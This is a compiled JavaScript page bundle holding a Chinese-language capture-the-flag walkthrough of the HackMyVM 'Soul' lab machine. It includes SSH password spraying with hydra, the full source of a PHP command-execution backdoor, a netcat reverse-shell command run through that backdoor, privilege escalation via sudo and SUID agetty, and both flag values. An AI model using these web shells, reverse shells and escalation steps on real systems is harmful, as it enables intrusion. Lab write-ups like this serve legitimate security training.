"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[3411],{300:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>i,default:()=>h,frontMatter:()=>a,metadata:()=>t,toc:()=>o});var r=s(5893),l=s(1151);const a={},i="Soul",t={id:"HackMyVM/Machines/Soul/index",title:"Soul",description:"[Linux VM] [Tested on VirtualBox] created by || sml",source:"@site/docs/HackMyVM/Machines/Soul/index.md",sourceDirName:"HackMyVM/Machines/Soul",slug:"/HackMyVM/Machines/Soul/",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Soul/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Soul/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackMyVM_Sidebar",previous:{title:"Slowman",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Slowman/"},next:{title:"SuidyRevenge",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/SuidyRevenge/"}},c={},o=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"web \u670d\u52a1",id:"web-\u670d\u52a1",level:2},{value:"User - daniel",id:"user---daniel",level:2},{value:"web \u76ee\u5f55\u53ef\u63a7",id:"web-\u76ee\u5f55\u53ef\u63a7",level:3},{value:"\u5206\u6790 nginx \u914d\u7f6e",id:"\u5206\u6790-nginx-\u914d\u7f6e",level:2},{value:"User - www-data",id:"user---www-data",level:2},{value:"\u73af\u5883\u63a2\u6d4b",id:"\u73af\u5883\u63a2\u6d4b",level:3},{value:"\u5c1d\u8bd5\u63d0\u6743",id:"\u5c1d\u8bd5\u63d0\u6743",level:3},{value:"User - gabriel",id:"user---gabriel",level:2},{value:"flag - user",id:"flag---user",level:3},{value:"\u73af\u5883\u63a2\u6d4b",id:"\u73af\u5883\u63a2\u6d4b-1",level:3},{value:"User - peter",id:"user---peter",level:2},{value:"\u73af\u5883\u63a2\u6d4b",id:"\u73af\u5883\u63a2\u6d4b-2",level:3},{value:"User - root",id:"user---root",level:2},{value:"flag - root",id:"flag---root",level:3}];function d(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",p:"p",pre:"pre",...(0,l.a)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.h1,{id:"soul",children:"Soul"}),"\n",(0,r.jsxs)(n.admonition,{type:"note",children:[(0,r.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || sml"}),(0,r.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2020-11-26"}),(0,r.jsx)(n.p,{children:"\u2714\ufe0f MD5 // 6248b98d48d47575c905dd8fc3361c6d"}),(0,r.jsx)(n.p,{children:"\u2620 Root // 49"}),(0,r.jsx)(n.p,{children:"\ud83d\udc80 User // 49"}),(0,r.jsx)(n.p,{children:"\ud83d\udcddNotes //\nHack and Fun. Tested on Virtualbox."})]}),"\n",(0,r.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,r.jsx)(n.p,{children:"\u9776\u673a IP"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.115\n"})}),"\n",(0,r.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"Nmap scan report for 192.168.56.115\nHost is up (0.00050s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey:\n|   2048 8a:e9:c1:c2:a3:44:40:26:6f:22:37:c3:fe:a1:19:f2 (RSA)\n|   256 4f:4a:d6:47:1a:87:7e:69:86:7f:5e:11:5c:4f:f1:48 (ECDSA)\n|_  256 46:f4:2c:28:53:ef:4c:2b:70:f8:99:7e:39:64:ec:07 (ED25519)\n80/tcp open  http    nginx 1.14.2\n|_http-server-header: nginx/1.14.2\n|_http-title: Site doesn't have a title (text/html).\n"})}),"\n",(0,r.jsx)(n.h2,{id:"web-\u670d\u52a1",children:"web \u670d\u52a1"}),"\n",(0,r.jsx)(n.p,{children:"\u5c1d\u8bd5\u7206\u7834"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"[22:07:32] 200 -   24B  - /index.html\n[22:07:45] 200 -    9B  - /robots.txt\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u67e5\u770b ",(0,r.jsx)(n.code,{children:"/robots.txt"})," \u7684\u6570\u636e"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"/nothing\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5c1d\u8bd5\u8bbf\u95ee ",(0,r.jsx)(n.code,{children:"/"}),"\uff0c\u662f\u8fd4\u56de\u4e00\u5f20\u56fe\u7247"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-html",children:'<img src="saint.jpg">\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u5c06\u56fe\u7247\u4e0b\u8f7d\u4e0b\u6765\u8fdb\u884c\u5206\u6790"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:'\u250c\u2500[randark@parrot]\u2500[~/tmp]\n\u2514\u2500\u2500\u257c $stegseek saint.jpg\nStegSeek 0.6 - https://github.com/RickdeJager/StegSeek\n\n[i] Found passphrase: ""\n[i] Original filename: "pass.txt".\n[i] Extracting to "saint.jpg.out".\n\n\u250c\u2500[randark@parrot]\u2500[~/tmp]\n\u2514\u2500\u2500\u257c $cat saint.jpg.out\nlionsarebigcats\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u5c1d\u8bd5\u8fdb\u884c\u5bc6\u7801\u55b7\u6d12\u653b\u51fb"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ hydra -I -v -V -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p lionsarebigcats 192.168.56.115 ssh -t 4\n......\n[22][ssh] host: 192.168.56.115   login: daniel   password: lionsarebigcats\n"})}),"\n",(0,r.jsx)(n.h2,{id:"user---daniel",children:"User - daniel"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[\u2717]\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ ssh daniel@192.168.56.115\ndaniel@192.168.56.115's password:\nLinux soul 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sun Feb 18 09:49:04 2024 from 192.168.56.102\ndaniel@soul:~$ whoami\ndaniel\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u7ecf\u8fc7\u63a2\u6d4b\uff0c\u8fd9\u91cc\u662f\u53d7\u9650 shell \u73af\u5883\uff0c\u5373\u4e3a ",(0,r.jsx)(n.code,{children:"rbash"})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"daniel@soul:~$ echo $0\n-rbash\n"})}),"\n",(0,r.jsx)(n.h3,{id:"web-\u76ee\u5f55\u53ef\u63a7",children:"web \u76ee\u5f55\u53ef\u63a7"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:'\u250c\u2500[randark@parrot]\u2500[/usr/share/webshells/php]\n\u2514\u2500\u2500\u257c $ python-server 80\n......\ndrwxr-xr-x 1 root root   64  1 \u6708 22 \u65e5 03:13 findsocket\n-rw-r--r-- 1 root root 2.8K 2021 \u5e74 11 \u6708 21 \u65e5 php-backdoor.php\n-rwxr-xr-x 1 root root 5.4K 2021 \u5e74 11 \u6708 21 \u65e5 php-reverse-shell.php\n-rw-r--r-- 1 root root  14K 2021 \u5e74 11 \u6708 21 \u65e5 qsd-php-backdoor.php\n-rw-r--r-- 1 root root  328 2021 \u5e74 11 \u6708 21 \u65e5 simple-backdoor.php\n......\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n192.168.56.115 - - [18/Feb/2024 23:30:13] "GET /simple-backdoor.php HTTP/1.1" 200 -\n\ndaniel@soul:~$ wget 192.168.56.102/simple-backdoor.php\ndaniel@soul:~$ mv simple-backdoor.php /var/www/html\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u6587\u4ef6\u6210\u529f\u4e0a\u4f20\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u88ab\u89e3\u6790"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[/usr/share/webshells/php]\n\u2514\u2500\u2500\u257c $ curl 192.168.56.115/simple-backdoor.php?cmd=cat+/etc/passwd\n\x3c!-- Simple PHP backdoor by DK (http://michaeldaw.org) --\x3e\n\n<?php\n\nif(isset($_REQUEST['cmd'])){\n        echo \"<pre>\";\n        $cmd = ($_REQUEST['cmd']);\n        system($cmd);\n        echo \"</pre>\";\n        die;\n}\n\n?>\n\nUsage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd\n\n\x3c!--    http://michaeldaw.org   2006    --\x3e\n"})}),"\n",(0,r.jsx)(n.h2,{id:"\u5206\u6790-nginx-\u914d\u7f6e",children:"\u5206\u6790 nginx \u914d\u7f6e"}),"\n",(0,r.jsx)(n.p,{children:"\u67e5\u770b nginx \u7684\u914d\u7f6e\u6587\u4ef6"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-conf",children:"user www-data;\nworker_processes auto;\npid /run/nginx.pid;\ninclude /etc/nginx/modules-enabled/*.conf;\n\nevents {\n        worker_connections 768;\n        # multi_accept on;\n}\n\nhttp {\n        sendfile on;\n        tcp_nopush on;\n        tcp_nodelay on;\n        keepalive_timeout 65;\n        types_hash_max_size 2048;\n\n        include /etc/nginx/mime.types;\n        default_type application/octet-stream;\n\n        ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE\n        ssl_prefer_server_ciphers on;\n\n        access_log /var/log/nginx/access.log;\n        error_log /var/log/nginx/error.log;\n\n        gzip on;\n\n        include /etc/nginx/conf.d/*.conf;\n        include /etc/nginx/sites-enabled/*;\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u53ef\u4ee5\u5728\u5176\u4e2d\u770b\u5230"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"include /etc/nginx/sites-enabled/*\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5e76\u4e14\u5e76\u6ca1\u6709\u5f00\u542f\u89e3\u6790"}),"\n",(0,r.jsx)(n.p,{children:"\u67e5\u770b\u6709\u54ea\u4e9b\u6587\u4ef6"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"daniel@soul:~$ ls -lh /etc/nginx/sites-enabled/\ntotal 0\nlrwxrwxrwx 1 root root 34 Nov 26  2020 default -> /etc/nginx/sites-available/default\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u67e5\u770b ",(0,r.jsx)(n.code,{children:"/etc/nginx/sites-enabled/default"})," \u7684\u914d\u7f6e\u6570\u636e"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-conf",children:"server {\n        listen 80 default_server;\n        listen [::]:80 default_server;\n\n        root /var/www/html;\n\n        # Add index.php to the list if you are using PHP\n        index index.html index.htm index.nginx-debian.html;\n\n        server_name _;\n\n        location / {\n                # First attempt to serve request as file, then\n                # as directory, then fall back to displaying a 404.\n                try_files $uri $uri/ =404;\n        }\n}\n\nserver {\n        listen 80;\n        listen [::]:80;\n\n        server_name lonelysoul.hmv;\n\n        root /var/www/html;\n        index index.html;\n\n        location / {\n                try_files $uri $uri/ =404;\n        }\n\n # pass PHP scripts to FastCGI server\n        #\n               location ~ \\.php$ {\n               include snippets/fastcgi-php.conf;\n        #\n        #       # With php-fpm (or other unix sockets):\n               fastcgi_pass unix:/run/php/php7.3-fpm.sock;\n        #       # With php-cgi (or other tcp sockets):\n        #       fastcgi_pass 127.0.0.1:9000;\n        }\n}\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u53ef\u4ee5\u770b\u5230 ",(0,r.jsx)(n.code,{children:"lonelysoul.hmv"})," \u8fd9\u4e2a domain \u4e0b\u7684\u914d\u7f6e\u91cc\u9762\u6709 php \u89e3\u6790\uff0c\u52a0\u5165 hosts \u6587\u4ef6\u4e4b\u540e\u5c1d\u8bd5\u8bbf\u95ee"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="/etc/hosts"',children:"192.168.56.115 lonelysoul.hmv\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u7136\u540e\u5c1d\u8bd5\u8bbf\u95ee"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[/usr/share/webshells/php]\n\u2514\u2500\u2500\u257c $ curl lonelysoul.hmv/simple-backdoor.php?cmd=whoami\n\x3c!-- Simple PHP backdoor by DK (http://michaeldaw.org) --\x3e\n\n<pre>www-data\n</pre>\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u547d\u4ee4\u88ab\u6210\u529f\u6267\u884c"}),"\n",(0,r.jsx)(n.h2,{id:"user---www-data",children:"User - www-data"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"# curl lonelysoul.hmv/simple-backdoor.php?cmd=nc+192.168.56.102+9999+-e+/bin/bash\n\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ pwncat-cs -lp 9999\n[10:07:14] Welcome to pwncat \ud83d\udc08!\n[10:07:41] received connection from 192.168.56.115:47562\n[10:07:41] 192.168.56.115:47562: registered new host w/ db\n(local) pwncat$ back\n(remote) www-data@soul:/var/www/html$ whoami\nwww-data\n"})}),"\n",(0,r.jsx)(n.h3,{id:"\u73af\u5883\u63a2\u6d4b",children:"\u73af\u5883\u63a2\u6d4b"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo -l"',children:"Matching Defaults entries for www-data on soul:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser www-data may run the following commands on soul:\n    (gabriel) NOPASSWD: /tmp/whoami\n"})}),"\n",(0,r.jsx)(n.h3,{id:"\u5c1d\u8bd5\u63d0\u6743",children:"\u5c1d\u8bd5\u63d0\u6743"}),"\n",(0,r.jsx)(n.p,{children:"\u90e8\u7f72\u6076\u610f\u8f7d\u8377"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"#!/bin/bash\n\nwhoami;\n\n/bin/bash\n"})}),"\n",(0,r.jsx)(n.h2,{id:"user---gabriel",children:"User - gabriel"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"(remote) www-data@soul:/tmp$ sudo -u gabriel /tmp/whoami\ngabriel\ngabriel@soul:/tmp$ whoami\ngabriel\n"})}),"\n",(0,r.jsx)(n.h3,{id:"flag---user",children:"flag - user"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"gabriel@soul:~$ cat user.txt\nHMViwazhere\n"})}),"\n",(0,r.jsx)(n.h3,{id:"\u73af\u5883\u63a2\u6d4b-1",children:"\u73af\u5883\u63a2\u6d4b"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo -l"',children:"Matching Defaults entries for gabriel on soul:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser gabriel may run the following commands on soul:\n    (peter) NOPASSWD: /usr/sbin/hping3\n"})}),"\n",(0,r.jsx)(n.h2,{id:"user---peter",children:"User - peter"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"gabriel@soul:~$ sudo -u peter /usr/sbin/hping3\nhping3> /bin/bash\npeter@soul:/home/gabriel$ whoami\npeter\n"})}),"\n",(0,r.jsx)(n.h3,{id:"\u73af\u5883\u63a2\u6d4b-2",children:"\u73af\u5883\u63a2\u6d4b"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo -l"',children:"Permission denied\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="getcap -r / 2>/dev/null"',children:"/usr/bin/ping = cap_net_raw+ep\n/usr/sbin/hping3 = cap_net_admin,cap_net_raw+eip\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="find / -perm -u=s -type f 2>/dev/null"',children:"/usr/bin/su\n/usr/bin/passwd\n/usr/bin/newgrp\n/usr/bin/mount\n/usr/bin/gpasswd\n/usr/bin/umount\n/usr/bin/chfn\n/usr/bin/sudo\n/usr/bin/chsh\n/usr/sbin/agetty\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/lib/eject/dmcrypt-get-device\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5728\u5176\u4e2d\uff0c\u53d1\u73b0 ",(0,r.jsx)(n.code,{children:"/usr/sbin/agetty"})," \u5177\u6709 suid \u6743\u9650\uff0c\u501f\u6b64\u53ef\u4ee5\u5b9e\u73b0\u63d0\u6743"]}),"\n",(0,r.jsx)(n.h2,{id:"user---root",children:"User - root"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"peter@soul:~$ /usr/sbin/agetty -o -p -l /bin/bash -a root tty\n\nDebian GNU/Linux 10 soul tty\n\nsoul login: root (automatic login)\n\nbash-5.0# whoami\nroot\n"})}),"\n",(0,r.jsx)(n.h3,{id:"flag---root",children:"flag - root"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"bash-5.0# cat rootflag.txt\nHMVohmygod\n"})})]})}function h(e={}){const{wrapper:n}={...(0,l.a)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},1151:(e,n,s)=>{s.d(n,{Z:()=>t,a:()=>i});var r=s(7294);const l={},a=r.createContext(l);function i(e){const n=r.useContext(a);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function t(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(l):e.components||l:i(e.components),r.createElement(a.Provider,{value:n},e.children)}}}]);